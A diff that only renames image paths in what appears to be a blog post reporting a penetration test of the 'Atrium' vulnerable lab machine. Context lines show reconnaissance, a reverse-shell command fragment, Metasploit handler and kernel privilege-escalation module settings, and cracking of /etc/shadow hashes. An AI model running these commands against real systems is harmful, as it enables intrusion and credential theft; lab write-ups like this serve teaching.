@@ -16,12 +16,12 @@ toc: true
 toc_label: "Table of Contents"
 toc_sticky: true
 header:
-  overlay_image: /assets/images/headers/atrium-project-banner.jpg
+  overlay_image: /assets/img/headers/atrium-project-banner.jpg
   overlay_filter: 0.7
-  og_image: /assets/images/headers/atrium-project-banner.jpg
+  og_image: /assets/img/headers/atrium-project-banner.jpg
 ---
 
-![image-center](/assets/images/headers/atrium-project-banner.jpg)
+![image-center](/assets/img/headers/atrium-project-banner.jpg)
 {: .align-center}
 
 **Skills Demonstrated**
@@ -63,7 +63,7 @@ The purpose of this report is to detail each step of the process, highlight crit
 > **Project Objective:** To perform reconnaissance, scanning, and identify potential vulnerabilities in a selected organization, and then execute controlled tests on a vulnerable machine. **Target Machine:** [Target Machine Atrium](https://mega.nz/file/4O0w3Tza#fGAUjHzRiGNmJY8Wlu9Mw3pC5ysP-P-nnBjvJVGTfqE) 
 
 ---
-![image-center](/assets/images/posts/atrium-report/atrium-project.png)
+![image-center](/assets/img/posts/atrium-report/atrium-project.png)
 {: .align-center}
 # 3. Phase 1 – Reconnaissance and Scanning
 
@@ -77,20 +77,20 @@ The first step was to establish connectivity and identify the target machine wit
     
 - **Network:** Bridge (both machines are on the same local network)
 
-![Successful ping test](/assets/images/posts/atrium-report/ping-test.png){: .align-center}
-![Netdiscover result 2](/assets/images/posts/atrium-report/netdiscover-2.png){: .align-center}
+![Successful ping test](/assets/img/posts/atrium-report/ping-test.png){: .align-center}
+![Netdiscover result 2](/assets/img/posts/atrium-report/netdiscover-2.png){: .align-center}
 
 
 A successful ping between the Kali machine and the victim confirmed network connectivity. 
 
 The `netdiscover` scan allowed us to identify the target machine on the network. 
 
-![Netdiscover result 1](/assets/images/posts/atrium-report/netdiscover-1.png){: .align-center}
+![Netdiscover result 1](/assets/img/posts/atrium-report/netdiscover-1.png){: .align-center}
 
 #### Port and Service Scanning with Nmap
 
 A comprehensive Nmap scan was performed to identify all open ports, running services, and the operating system of the target. 
-![Basic Nmap scan](/assets/images/posts/atrium-report/nmap-basic-scan.png){: .align-center}
+![Basic Nmap scan](/assets/img/posts/atrium-report/nmap-basic-scan.png){: .align-center}
 
 #### Detected Operating System:
 
@@ -176,7 +176,7 @@ QUIT
 ```
 
 **Expected Outcome:** The execution of this payload creates the file `/tmp/pwned.txt` on the target server, proving the ability to execute arbitrary commands remotely.
-![Successful ping test](/assets/images/posts/atrium-report/telnet-conect.png)
+![Successful ping test](/assets/img/posts/atrium-report/telnet-conect.png)
 
 ### Web Application Vulnerabilities
 
@@ -186,7 +186,7 @@ QUIT
     
 - **Vulnerability:** This login panel relies on **client-side JavaScript** for credential validation. The username (`admin`) and password (`supersecret`) were hardcoded and easily visible in the page source.
 
-![Captured Flag](/assets/images/posts/atrium-report/flag1.png )
+![Captured Flag](/assets/img/posts/atrium-report/flag1.png )
 
 ### Critical Vulnerability — `/login_2/`
 
@@ -198,7 +198,7 @@ QUIT
 
 **Response:** `FLAGH{BYPASSING_HTTP_METH=DS_G00D!}`
 
-![Captured Flag](/assets/images/posts/atrium-report/flag2.png )
+![Captured Flag](/assets/img/posts/atrium-report/flag2.png )
 
 ### False Positives Detected
 
@@ -226,7 +226,7 @@ The goal of this exploitation was to obtain a **reverse shell** by leveraging th
 
 - **Initial Tests:** Initial attempts with a standard bash reverse shell (`127.0.0.1; bash -i >`) were unsuccessful, likely due to filtering of special characters like `>`, `&`, and `"`.
 
-![RCE vulneravility find](/assets/images/posts/atrium-report/vuln-rce.png)
+![RCE vulneravility find](/assets/img/posts/atrium-report/vuln-rce.png)
     
 - **Solution: URL-Encoded Payload:** To bypass the filtering, a classic bash reverse shell payload was **URL-encoded**.
     
@@ -246,7 +246,7 @@ The goal of this exploitation was to obtain a **reverse shell** by leveraging th
     ```
     
 - **Result:** The reverse connection was successfully established, and a remote shell from the victim machine was obtained.
-![System acces granted](/assets/images/posts/atrium-report/reverseshell.png )
+![System acces granted](/assets/img/posts/atrium-report/reverseshell.png )
 
 ### Interactive Shell (TTY) Treatment
 
@@ -275,7 +275,7 @@ chmod +x shell.elf
 ./s.elf
 ```
 
-![System acces granted](/assets/images/posts/atrium-report/reverseshell1.png )
+![System acces granted](/assets/img/posts/atrium-report/reverseshell1.png )
 ### Payload Execution Metasploit
 
 A listener was set up on the attacking machine using **Metasploit's `multi/handler` module** to catch the reverse shell.
@@ -289,9 +289,9 @@ run -j
 ```
 Once executed on the victim, the handler caught the connection, and a **Meterpreter session** was successfully established.
 
-![System acces granted](/assets/images/posts/atrium-report/startmsf.png )
+![System acces granted](/assets/img/posts/atrium-report/startmsf.png )
 
-![System acces granted](/assets/images/posts/atrium-report/startmsf1.png )
+![System acces granted](/assets/img/posts/atrium-report/startmsf1.png )
 
 ---
 
@@ -318,7 +318,7 @@ To identify potential privilege escalation vectors, tools like **LinPEAS** and *
     
 - The `/opt/james-2.3.2.1/bin/run.sh` script was being executed automatically. However, since it uses absolute paths, a `PATH` hijacking attack was not feasible.
     
-![Running LinPEAS](/assets/images/posts/atrium-report/pspy1.png)
+![Running LinPEAS](/assets/img/posts/atrium-report/pspy1.png)
 
 ### Attempt to Crack Hashes
 
@@ -327,12 +327,12 @@ The hash for the `deloitte` user was copied from `/etc/shadow` and passed to **J
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
 ```
-![Showing `run.sh`](/assets/images/posts/atrium-report/phoenix-run.png)
+![Showing `run.sh`](/assets/img/posts/atrium-report/phoenix-run.png)
 
 This is a standard procedure to obtain plaintext passwords and gain access to other accounts.
 
 ### Final Phase: Privilege Escalation to Root
-![Meterpreter acces](/assets/images/posts/atrium-report/pwed.png )
+![Meterpreter acces](/assets/img/posts/atrium-report/pwed.png )
 The final objective was to gain **root** privileges on the victim machine by exploiting a known local vulnerability.
 
 - **Exploit Execution:** Based on the previous enumeration, the `exploit/linux/local/bpf_sign_extension_priv_esc` module was chosen as it affects the identified kernel version.
@@ -347,7 +347,7 @@ set PAYLOAD linux/x64/meterpreter/reverse_tcp
 run
 ```
 
-![Acces root](/assets/images/posts/atrium-report/root.png )
+![Acces root](/assets/img/posts/atrium-report/root.png )
 - **Result:** The exploit was successful, and a new **meterpreter session** with **root** privileges was obtained. This confirmed a complete system compromise.
 
 
